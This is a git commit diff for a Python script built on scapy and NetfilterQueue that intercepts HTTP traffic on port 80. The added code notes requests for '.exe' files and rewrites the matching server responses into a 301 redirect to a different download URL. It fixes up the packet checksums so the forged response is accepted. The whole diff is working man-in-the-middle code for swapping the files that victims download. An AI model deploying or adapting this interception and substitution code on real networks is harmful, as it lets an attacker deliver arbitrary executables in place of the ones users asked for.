7e945cfc687a915e82a5862f6b695935d159fb75
A1DS19 <jp06171@gmail.com>
2021-08-14 04:04:15 +0100

    replace_files*

--- replace_download.py
+++ replace_download.py
@@ -5,6 +5,7 @@ import scapy.all as scapy
 # http == port 80
 
 queue = NetfilterQueue()
+ack_list = []
 
 
 def process_packet(packet):
@@ -13,18 +14,29 @@ def process_packet(packet):
         try:
 
             if scapy_packet[scapy.TCP].dport == 80:
-                if ".exe" in str(scapy_packet[scapy.Raw].load):
-                    print("[+].EXE Request")
-                    print(scapy_packet.show())
+                if ".exe" in str(scapy_packet[scapy.Raw].load.decode()):
+                    print("[+].exe Request")
+                    ack_list.append(scapy_packet[scapy.TCP].ack)
             elif scapy_packet[scapy.TCP].sport == 80:
-                pass
-                # print("Response")
-                # print(scapy_packet.show())
-
+                if scapy_packet[scapy.TCP].seq in ack_list:
+                    scapy_packet = replace_file(scapy_packet)
+                    packet.set_payload(bytes(scapy_packet))
+                    print("[+]File replaced")
         except IndexError:
             pass
-
     packet.accept()
+
+
+def replace_file(scapy_packet):
+    ack_list.remove(scapy_packet[scapy.TCP].seq)
+    print("[+]Replacing file")
+    scapy_packet[
+        scapy.Raw
+    ].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://cdn.cloudflare.steamstatic.com/client/installer/SteamSetup.exe\n\n"
+    del scapy_packet[scapy.IP].len
+    del scapy_packet[scapy.IP].chksum
+    del scapy_packet[scapy.TCP].chksum
+    return scapy_packet
 
 
 def create_iptables_queue():
